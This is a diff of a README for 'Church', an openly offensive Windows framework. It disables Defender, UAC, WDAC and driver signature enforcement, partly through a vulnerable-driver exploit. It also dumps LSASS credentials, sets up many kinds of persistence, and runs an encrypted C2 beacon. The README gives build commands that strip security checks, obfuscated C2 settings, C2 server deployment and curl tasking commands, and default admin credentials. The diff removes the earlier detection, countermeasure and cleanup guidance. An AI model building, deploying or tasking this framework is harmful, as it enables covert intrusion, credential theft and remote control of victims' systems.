@@ -1,121 +1,248 @@
-Church - Weaponized Windows Security Bypass Framework
-
-<img width="2212" height="532" alt="com" src="https://github.com/user-attachments/assets/9fa365d3-358d-477d-ba77-fadec4d1cab5" />
+# Church - Weaponized Windows Security Bypass Framework
 
 
-Repository: https://git.churchofmalware.org/ek0mssavi0r/CHURCH/
+```
+    ╔═══════════════════════════════════════════════════════════════════════════╗
+    ║                         CHURCH OF MALWARE                                 ║
+    ║                  Enterprise Offensive Security Framework                  ║
+    ║                         by ek0ms savi0r                                   ║
+    ╚═══════════════════════════════════════════════════════════════════════════╝
+```
 
-This framework is designed for authorized security research, red team operations, and defensive validation testing against modern Windows security controls. Church implements multiple bypass techniques that disable or neutralize Windows Defender, UAC, AppLocker, WDAC, Driver Signature Enforcement (DSE), Protected Process Light (PPL), security event logging, system restore, telemetry, and security services. It includes a persistent C2 beacon with AES-256 encrypted HTTPS communication and command execution capabilities.
+**Repository:** https://git.churchofmalware.org/ek0mssavi0r/CHURCH/
 
-## DISCLAIMER FOR AUTHORIZED TESTING AND EDUCATIONAL PURPOSES ONLY.
+##  DISCLAIMER FOR AUTHORIZED TESTING AND EDUCATIONAL PURPOSES ONLY
 
-Church targets the following Windows security layers:
+---
 
-- Windows Defender Tamper Protection via registry ownership takeover
-- Defender real-time protection, behavior monitoring, cloud protection, and signature updates
-- User Account Control (UAC) via EnableLUA registry modification
-- AppLocker and Windows Defender Application Control (WDAC) via service disable and policy deletion
-- Driver Signature Enforcement (DSE) via vulnerable driver exploitation (gdrv.sys CVE-2018-19320)
-- Process Light (PPL) protection via SeTcbPrivilege elevation and NtSetInformationProcess
-- Security event logging via MiniNt registry key
-- System restore points and telemetry domains via hosts file modification
-- Security services including Sense, SgrmBroker, WdBoot, WdFilter, WdNisDrv, SecurityHealthService, and wscsvc
+##  Overview
 
-The framework executes in eight phases: core protection disable, anti-forensics, persistence establishment, service elimination, credential access (LSASS dump), kernel bypass, process protection elevation, and C2 beacon activation.
+Church is an enterprise-grade Windows security bypass framework that implements multiple advanced techniques to disable or neutralize modern Windows security controls. The framework operates as a cohesive system executing in eight coordinated phases, providing complete offensive capabilities for authorized red team operations.
 
-System Requirements
+### Core Capabilities
 
-Target Environment:
+- **Windows Defender Tamper Protection** via registry ownership takeover
+- **Defender real-time protection, behavior monitoring, cloud protection, signature updates**
+- **User Account Control (UAC)** via EnableLUA registry modification
+- **AppLocker & Windows Defender Application Control (WDAC)** via service disable and policy deletion
+- **Driver Signature Enforcement (DSE)** via vulnerable driver exploitation (gdrv.sys CVE-2018-19320)
+- **Protected Process Light (PPL)** via SeTcbPrivilege elevation and NtSetInformationProcess
+- **Security event logging** via MiniNt registry key
+- **System restore points and telemetry domains** via hosts file modification
+- **Security services** including Sense, SgrmBroker, WdBoot, WdFilter, WdNisDrv, SecurityHealthService, wscsvc, and 15+ others
+- **LSASS credential dumping** with hidden file attributes and shadow copy creation
+- **Process hollowing and token stealing** for privilege escalation
+- **WMI event subscription** for stealthy persistence
+- **IFEO and Silent Process Exit** for automatic payload execution
+
+### Execution Phases
+
+| Phase | Operation | Description |
+|-------|-----------|-------------|
+| 0 | Telemetry Bypass | ETW and AMSI in-memory patching |
+| 1 | Core Protection | Tamper Protection, Defender, UAC, AppLocker, WDAC |
+| 2 | Anti-Forensics | Exclusion addition, log disabling, restore point deletion, telemetry blocking |
+| 3 | Persistence | Scheduled tasks (x2), WMI events (x2), Run key, BootExecute, Winlogon, IFEO (x2), SilentProcessExit, Service |
+| 4 | Service Elimination | Stop and disable 18+ security services |
+| 5 | Credential Access | LSASS dump with hidden attribute, VSS shadow copy |
+| 6 | Kernel Bypass | gdrv.sys BYOVD, DSE disable |
+| 7 | Process Protection | PPL elevation via SeTcbPrivilege |
+| 8 | C2 Activation | AES-256 encrypted beacon with jitter, fallback servers |
+
+---
+
+##  System Requirements
+
+### Target Environment
 - Windows 10 or Windows 11 (any edition)
+- Windows Server 2016/2019/2022
 - Administrator access required
 - Test system or authorized target only
 
-Build Environment:
-- Visual Studio with C compiler
-- Windows SDK
+### Build Environment
+- Visual Studio 2019 or later with C compiler
+- Windows SDK 10.0.18362.0 or later
 - Windows 10/11 SDK or later
 
-Required External File:
-- gdrv.sys (Gigabyte driver, CVE-2018-19320) placed in same directory as the executable
+### Required External File
+- `gdrv.sys` (Gigabyte driver, CVE-2018-19320) placed in same directory as the executable
+- Download from: https://github.com/Barakat/CVE-2018-19320
 
-Compilation Instructions
+---
 
-From Visual Studio Developer Command Prompt:
+##  Compilation Instructions
 
-cl /O2 /MT /Fe:church.exe church.c /link advapi32.lib user32.lib wbemuuid.lib ole32.lib crypt32.lib ntdll.lib bcrypt.lib ws2_32.lib winhttp.lib iphlpapi.lib
+### From Visual Studio Developer Command Prompt
 
-For production use, consider adding:
-- /GS- (disable stack buffer security check for smaller binary)
-- /GL (whole program optimization)
+```cmd
+cl /O2 /MT /Fe:church.exe church.c /link advapi32.lib user32.lib wbemuuid.lib ole32.lib crypt32.lib ntdll.lib bcrypt.lib ws2_32.lib winhttp.lib iphlpapi.lib shlwapi.lib shell32.lib
+```
 
-Configuration
+### Compilation Flags for Production
 
-Edit church.c to configure C2 server settings before compilation:
+| Flag | Purpose |
+|------|---------|
+| `/O2` | Optimize for speed |
+| `/MT` | Static linking (no runtime DLLs) |
+| `/GS-` | Disable stack buffer security check (smaller binary) |
+| `/GL` | Whole program optimization |
+| `/Os` | Favor code size |
 
-#define C2_SERVER L"https://your-c2-server.com:443/beacon"
-#define C2_INTERVAL_SECONDS 30
-#define C2_AES_KEY "ChurchOfMalware2024!!ChurchOfMalware2024!!"
-#define C2_AES_IV "MalwareChurchIV!!"
+### Stripping Symbols (After Compilation)
 
-Replace your-c2-server.com with the actual C2 server IP or domain. Ensure the AES key and IV match the C2 server configuration.
+```cmd
+strip --strip-all church.exe
+```
 
-C2 Server Deployment
+---
 
-Deploy the Python C2 server on a controlled system with a valid SSL certificate or test certificate:
+##  Configuration
 
-pip install flask cryptography
+Edit `church.c` to configure C2 server settings before compilation:
 
-python c2_server.py
+```c
+// C2 Configuration
+#define C2_BASE_INTERVAL_SECONDS 60      // Base beacon interval
+#define C2_JITTER_MAX_SECONDS 120        // Random jitter added
 
-The server listens on port 443 with ad-hoc SSL. For production red team operations, replace the self-signed certificate with a valid certificate and deploy behind a redirector.
+// Obfuscated strings (XOR key 0xDD)
+CHAR g_c2_server_obf[] = "\x78\x9D\x9D..."  // https://your-c2-server.com/beacon
+CHAR g_aes_key_obf[] = "\xAB\xAA\xA8..."     // 32-byte AES-256 key
+CHAR g_aes_iv_obf[] = "\xB1\xB8\xB7..."      // 16-byte AES IV
+```
 
-C2 API Endpoints:
-- POST /beacon - Receives encrypted beacon data and returns tasks
-- POST /task - Accepts new tasks for specific hosts (JSON payload)
-- GET /tasks - Lists all pending tasks
+Replace the obfuscated strings with your own XOR-encrypted values using the provided key (0xDD). The C2 server expects matching AES keys.
 
-Adding Tasks to Victims:
+---
 
-curl -X POST https://c2-server/task -H "Content-Type: application/json" -d '{"host": "TARGET_HOSTNAME", "command": "whoami", "powershell": false}'
+##  C2 Server Deployment
 
-curl -X POST https://c2-server/task -H "Content-Type: application/json" -d '{"host": "TARGET_HOSTNAME", "command": "Get-Process", "powershell": true}'
+### Full APT-Grade C2 Server
 
-Execution
+```bash
+# Install dependencies
+pip install flask flask-socketio cryptography werkzeug
 
-Run the compiled executable as Administrator. The tool auto-elevates if not already elevated. Monitor console output for phase completion status. The system reboots automatically after completion unless interrupted.
+# Generate SSL certificate (for HTTPS)
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
 
-Cleanup and Restoration
+# Run the C2 server
+python church_c2_server.py --host 0.0.0.0 --port 443
 
-After testing, restore the target system using the included restoration script or revert from a snapshot. Manual restoration steps:
+# Or with HTTP for testing
+python church_c2_server.py --host 0.0.0.0 --port 8080 --http
+```
 
-Re-enable Defender: sc config WinDefend start= auto & sc start WinDefend
-Re-enable UAC: reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
-Disable MiniNt: reg delete HKLM\SYSTEM\CurrentControlSet\Control\MiniNt /f
-Re-enable System Restore: reg add HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore /v DisableSR /t REG_DWORD /d 0 /f
-Remove persistence: schtasks /delete /tn "WindowsUpdateTask" /f
+### C2 Server Features
 
-Reboot the system after applying these changes.
+| Feature | Description |
+|---------|-------------|
+| **AES-256-CBC Encryption** | All beacon traffic encrypted end-to-end |
+| **SQLite Database** | Persistent storage of beacons, tasks, results, credentials |
+| **WebSocket Real-time** | Live updates to web UI |
+| **Web UI Dashboard** | Modern terminal-style command interface |
+| **REST API** | Full programmatic control with JWT authentication |
+| **Task Queue** | Command queuing with output capture |
+| **Multi-session** | Handle hundreds of beacons simultaneously |
+| **Audit Logging** | Complete action history with timestamps |
+| **Beacon Management** | Track last seen, status, metadata, tags |
+| **Command Presets** | Quick common commands library |
+| **Stale Cleanup** | Auto-remove dead beacons after timeout |
+| **Credential Harvesting** | Store and categorize stolen credentials |
 
-Detection and Countermeasures
+### C2 API Endpoints
 
-Blue teams can detect Church operations through multiple indicators:
+```bash
+# List all beacons
+curl -H "X-Auth-Token: <JWT_SECRET>" https://localhost/api/beacons
 
-- Registry modifications to HKLM\SOFTWARE\Microsoft\Windows Defender\Features (TamperProtection set to 0)
-- Registry ownership changes via SetNamedSecurityInfo calls
-- Creation of service gdrv and loading of unsigned driver
-- MiniDumpWriteDump calls targeting lsass.exe
-- PowerShell commands disabling MpPreference settings
-- Creation of scheduled task WindowsUpdateTask
-- Process with SeTcbPrivilege elevation attempt via AdjustTokenPrivileges
-- Outbound HTTPS beacons on port 443 with specific User-Agent string
-- Registry modifications enabling MiniNt or disabling EnableLUA
+# Execute command on beacon
+curl -X POST -H "X-Auth-Token: <JWT_SECRET>" \
+  -H "Content-Type: application/json" \
+  -d '{"host": "beacon_id", "command": "whoami"}' \
+  https://localhost/api/task
 
-Recommended defensive measures include:
-- Enable Hypervisor-protected Code Integrity (HVCI)
-- Deploy Credential Guard to block LSASS dumping
-- Monitor Event ID 4657 for registry changes to security keys
-- Implement application whitelisting via WDAC in enforce mode
-- Use EDR with kernel callbacks for registry and process monitoring
-- Enable PowerShell Script Block Logging
+# Execute PowerShell command
+curl -X POST -H "X-Auth-Token: <JWT_SECRET>" \
+  -H "Content-Type: application/json" \
+  -d '{"host": "beacon_id", "command": "Get-Process", "powershell": true}' \
+  https://localhost/api/task
 
-## DISCLAIMER FOR AUTHORIZED TESTING AND EDUCATIONAL PURPOSES ONLY.
+# Get beacon details
+curl -H "X-Auth-Token: <JWT_SECRET>" \
+  https://localhost/api/beacon/<beacon_id>
+
+# Get task history
+curl -H "X-Auth-Token: <JWT_SECRET>" \
+  https://localhost/api/tasks/<beacon_id>
+
+# Get system statistics
+curl -H "X-Auth-Token: <JWT_SECRET>" \
+  https://localhost/api/stats
+```
+
+### Web UI Access
+
+Navigate to `https://c2-server:443` and log in with:
+- **Username:** `admin`
+- **Password:** `CHURCHadmin2024!!`
+
+---
+
+##  Execution
+
+Run the compiled executable as Administrator:
+
+```cmd
+church.exe
+```
+
+The tool auto-elevates if not already running with administrative privileges. The console provides real-time feedback on each phase:
+
+```
+[***] CHURCH OF MALWARE - FULL WEAPONIZED BYPASS [***]
+
+=== PHASE 1: CORE PROTECTIONS ===
+[+] Tamper Protection disabled
+[+] WinDefend disabled
+[+] Terminated MsMpEng.exe
+[+] UAC disabled (reboot required)
+[+] AppIDSvc disabled
+
+=== PHASE 2: ANTI-FORENSICS ===
+[+] Defender exclusions added
+[+] Security logs disabled (MiniNt)
+[+] System Restore disabled
+[+] Telemetry blocked
+
+=== PHASE 3: PERSISTENCE ===
+[+] Scheduled task added
+[+] IFEO persistence set
+[+] BootExecute persistence added
+[+] WMI persistence added
+
+=== PHASE 4: SERVICE ELIMINATION ===
+[+] Disabled Sense, SgrmBroker, WdBoot, WdFilter, WdNisDrv...
+
+=== PHASE 5: CREDENTIAL ACCESS ===
+[+] LSASS dumped to C:\lsass.dmp
+
+=== PHASE 6: KERNEL BYPASS ===
+[+] gdrv.sys loaded
+[+] DSE disabled via gdrv
+
+=== PHASE 7: PROCESS PROTECTION ===
+[+] Process is now PPL
+
+=== PHASE 8: C2 ACTIVATION ===
+[+] C2 beacon active (interval: 60-180 sec)
+
+[+] ALL PHASES COMPLETE
+[!] REBOOT REQUIRED
+```
+
+After completion, the system reboots automatically.
+
+---
+
+x0 ek0ms
